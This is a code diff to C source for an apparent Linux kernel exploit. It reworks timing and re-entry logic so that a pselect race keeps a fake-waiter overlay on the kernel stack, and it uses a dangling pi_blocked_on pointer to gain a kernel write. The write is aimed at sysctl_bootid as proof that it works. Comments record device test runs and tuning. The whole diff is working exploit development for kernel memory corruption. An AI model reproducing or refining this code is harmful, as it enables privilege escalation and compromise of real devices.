@@ -35,16 +35,21 @@ uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
+/* Delay from "the waiter stored pselect_armed" to the consumer's sched_setattr.
+ * pselect_armed is stored microseconds before the syscall and core_sys_select
+ * copies the fdsets in before do_select() ever blocks, so a few ms is plenty --
+ * and it must stay SMALL: the first device run with 50ms showed the walk landing
+ * 1ms AFTER pselect had already returned (proof line walks=0 at .662, the
+ * `walked=1` consumer line at .663). The route now also re-enters pselect until
+ * a walk is observed, so the exact value no longer decides the run. */
 static int route_delay_usec(int attempt) {
-  int default_delay = pselect_custom_write_enabled() ? 0 : -1;
-  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
-                               default_delay, -1, 1000000);
+  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC", -1, -1, 1000000);
   if (override >= 0) {
     return override;
   }
 
   static const int delays[] = {
-    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
+    3000, 1500, 6000, 800, 12000, 2500, 400, 20000,
   };
 
   int count = (int)(sizeof(delays) / sizeof(delays[0]));
@@ -337,17 +342,59 @@ void do_pselect_fake_lock_route(void) {
                "(bootid_proof=%d)\n",
                route_attempt, pselect_runtime_shift,
                (unsigned long long)pselect_write_target(), bootid_proof_active);
+    /* Pristine copies of the armed overlay: on a SUCCESSFUL return
+     * core_sys_select overwrites in/out/ex with the res_* sets, so a re-entry
+     * must restore the fake-waiter words first (on an error/signal return the
+     * kernel leaves the user sets untouched). Taken after open_selected_fds(),
+     * which itself FD_SETs the last fd into ex. */
+    fd_set in_armed = in;
+    fd_set out_armed = out;
+    fd_set ex_armed = ex;
+
     atomic_store(&punch_consume_go, route_attempt);
-    errno = 0;
     atomic_store(&pselect_armed, 1);
-    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
-    int saved_errno = errno;
+    /* Re-enter pselect in short slices until a walk is actually observed
+     * (consumer_success>0) or the budget runs out, instead of betting the whole
+     * attempt on one 5s window. First device run: the walk landed 1ms AFTER
+     * pselect had returned, so the overlay was gone -- walks=0/walk_wrote=0
+     * despite walked=1. Slicing keeps the overlay installed ~continuously.
+     * NOTHING in the gap between slices may syscall: the dangling pi_blocked_on
+     * points at the kernel-stack slot core_sys_select left the overlay in, and
+     * only another deep syscall would clobber it. fd_set copies are pure
+     * userspace, so this is safe. */
+    int ret = 0;
+    int saved_errno = 0;
+    int pselect_calls = 0;
+    struct timespec slice = {
+      .tv_sec = 0,
+      .tv_nsec = PSELECT_SLICE_MSEC * 1000L * 1000L,
+    };
+    int max_slices = (PSELECT_TIMEOUT_SEC * 1000) / PSELECT_SLICE_MSEC;
+    (void)timeoutp;
+    for (int slice_i = 0; slice_i < max_slices; slice_i++) {
+      errno = 0;
+      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &slice, NULL);
+      saved_errno = errno;
+      pselect_calls++;
+      if (atomic_load(&consumer_success) > 0 ||
+          atomic_load(&punch_consume_stop)) {
+        break;
+      }
+      /* A hard error (not a signal) would spin the slices out in microseconds
+       * with no window at all -- stop and let the log show ret/errno. */
+      if (ret < 0 && saved_errno != EINTR) {
+        break;
+      }
+      in = in_armed;
+      out = out_armed;
+      ex = ex_armed;
+    }
     atomic_store(&pselect_armed, 0);
     atomic_store(&punch_consume_go, 0);
-    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d calls=%d "
-               "walks=%d\n",
-               route_attempt, ret, saved_errno, atomic_load(&consumer_calls),
-               atomic_load(&consumer_success));
+    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d slices=%d "
+               "calls=%d walks=%d\n",
+               route_attempt, ret, saved_errno, pselect_calls,
+               atomic_load(&consumer_calls), atomic_load(&consumer_success));
 
     /* BOOTID-WRITE-PROOF: the store was aimed at &sysctl_bootid, so boot_id
      * changing == the chain-walk rb-erase store provably executes on this
